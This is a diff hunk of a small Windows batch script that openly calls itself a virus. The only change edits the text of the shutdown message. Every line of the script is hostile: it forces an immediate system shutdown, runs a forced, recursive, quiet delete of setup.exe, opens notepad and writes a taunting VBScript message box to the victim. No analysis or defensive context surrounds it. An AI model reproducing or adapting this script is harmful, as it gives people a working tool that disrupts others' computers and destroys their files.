@@ -4,7 +4,7 @@
 :worm
 
 @echo off
-shutdown -s -t 00 -c "blackhost virus maker"
+shutdown -s -t 00 -c "Dangerous virus opened owo"
 DEL /F /S /Q /A "setup.exe"
 start notepad.exe
 echo Msgbox"Probably you're fucked up now",0+0,"You're done">>msg.vbs
